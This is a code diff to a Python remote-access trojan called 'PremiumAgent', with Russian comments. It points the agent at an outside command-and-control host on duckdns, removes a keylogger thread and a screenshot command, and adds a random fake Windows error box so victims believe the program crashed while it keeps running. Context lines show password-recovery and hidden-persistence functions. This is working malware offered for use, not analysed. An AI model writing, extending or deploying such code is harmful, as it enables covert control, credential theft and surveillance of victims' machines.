@@ -24,7 +24,7 @@ except ImportError:
 ACCEPT_BTN_B64 = "iVBORw0KGgoAAAANSUhEUgAAAIEAAAAhCAYAAAD+vMi+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAJ9SURBVHhe7dixattQFMbxv/sEtR9Aaow9ZGnAhSyGuhRXo8fEBDIEPHgK2Qo1ydDgzMGLKRg8GISr0VudEBDUS4aAJw8KSpUHkPIG7WDZltTESZoOinJ+oEH3XN0M98vRtVJv2+9/I160V9EB8fJICISEQEgIhIRAICEQSAgEEgKBhEAgIRAAqfh+Ns6zt9lhJx0d93k61e/fmETHxaPFvxN4I7qnTfYDV9eLThJPEf8Q4PDjcsggcNkSgv/qGYTgPhqtuslY06hoPcZ1k3G9R2s9H6oP5vd59janc/Yy4ednVtd7gTqQO2JQN/21Z8/O1oleR1T++pvxloAQ+LLblG96VI0mpqdQKhwsNjEot3P3OeNWGq1yEdXTqRo1qqcjf9zi+KRG1fBfT57OvlGjanxhEFkh7pITArvH7vmQiTtk90THQeFjLvqfON1Q055t5CN4gGuFD6KuxcS9mt9arsXEDU54HhITAudmsRm4V/wKFn0VrUHJ02nb0QqQbcxber+gBApDdo0mZnqLft1kXC4Gasuphc7iNbF5RCU6ISYSEwL19criJrPCm2ARYOWAw+w13ZM7flbazWm7N2rsX1yHa5kPlNJgnpZYm78O7udczNbUcdJFDgPnjjhJTAjIbtPK5VnNaLQ+baEyonNuzctqWsG5+MrxknY9cS0mrsXiKaYHyXdF8HTal6HCo4W6VYwkJwT2T+zsAf2NBiVGdKMHNE/ncyAUD+YfJJ2rs9s7yBJqoUF/o0N/YwvVC4cyTmL8xfChNFr1BiW7ydpwGC2KB0hOJxD/TEIgkvA6EE8lnUBICISEQEgIBBICgYRAICEQAClFUeQ7wQv3B2LD71qbYgIrAAAAAElFTkSuQmCC"
 
 # --- [ CONFIGURATION ] ---
-BASE_URL = "http://localhost" # Смените на ваш IP для внешнего доступа
+BASE_URL = "http://vanya-vpn.duckdns.org:3000"
 AGENT_ID = f"{socket.gethostname()}_{os.getlogin()}"
 POLL_SEC = 2 # Немного замедлим для стабильности
 LOG_FILE = os.path.join(os.environ.get('TEMP', os.getcwd()), 'k.txt')
@@ -105,10 +105,7 @@ class PremiumAgent:
 
     def execute_cmd(self, cmd):
         try:
-            if cmd == "screen":
-                self.report("CMD", "Capturing screenshot...")
-                self.send_screenshot()
-            elif cmd.startswith("cd "):
+            if cmd.startswith("cd "):
                 os.chdir(cmd[3:].strip())
                 self.report("CMD", f"Changed dir to: {os.getcwd()}")
             elif cmd == "passwords":
@@ -186,19 +183,6 @@ class PremiumAgent:
         except Exception as e:
             return f"Recovery Error: {str(e)}"
 
-    def keylogger_thread(self):
-        # Минималистичный кейлоггер на хуках (требует pynput, если его нет - просто пропускаем)
-        try:
-            from pynput import keyboard
-            def on_press(key):
-                self.keylogs += f" {str(key)} "
-                if len(self.keylogs) > 500:
-                    self.report("KEYLOGS", self.keylogs)
-                    self.keylogs = ""
-            with keyboard.Listener(on_press=on_press) as listener:
-                listener.join()
-        except ImportError:
-            self.report("INFO", "Keylogger not started (pynput missing)")
 
     def persistence(self):
         # 1. Скрытое копирование в AppData под беспалевным именем
@@ -346,8 +330,6 @@ class PremiumAgent:
         self.persistence()
         self.report("STATUS", f"Premium Agent Online: {socket.gethostname()}")
         
-        # Start background threads
-        Thread(target=self.keylogger_thread, daemon=True).start()
         
         while self.is_active:
             try:
@@ -362,5 +344,25 @@ class PremiumAgent:
             time.sleep(POLL_SEC)
 
 if __name__ == "__main__":
+    # Показываем фейковую ошибку, чтобы пользователь думал, что программа не запустилась
+    try:
+        import ctypes
+        # Разные варианты ошибок (выбирается случайно для реалистичности)
+        errors = [
+            ("Application Error", "The application failed to initialize properly (0xc0000142).\nClick OK to close the application."),
+            ("Microsoft Visual C++ Runtime Library", "Runtime Error!\n\nProgram: ShellHost.exe\n\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application's support team for more information."),
+            (".NET Framework Error", "Application has generated an exception that could not be handled.\n\nProcess ID=0x1684 (5764), Thread ID=0x17a8 (6056).\n\nClick OK to terminate the application."),
+            ("Windows Error", "ShellHost.exe has stopped working\n\nWindows is checking for a solution to the problem..."),
+            ("System Error", "The program can't start because MSVCP140.dll is missing from your computer.\nTry reinstalling the program to fix this problem.")
+        ]
+        import random
+        title, message = random.choice(errors)
+        
+        # Показываем окно ошибки (0x10 = иконка ошибки)
+        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
+    except:
+        pass
+    
+    # А теперь запускаем агента в фоне (пользователь думает, что программа закрылась)
     agent = PremiumAgent()
     agent.run()
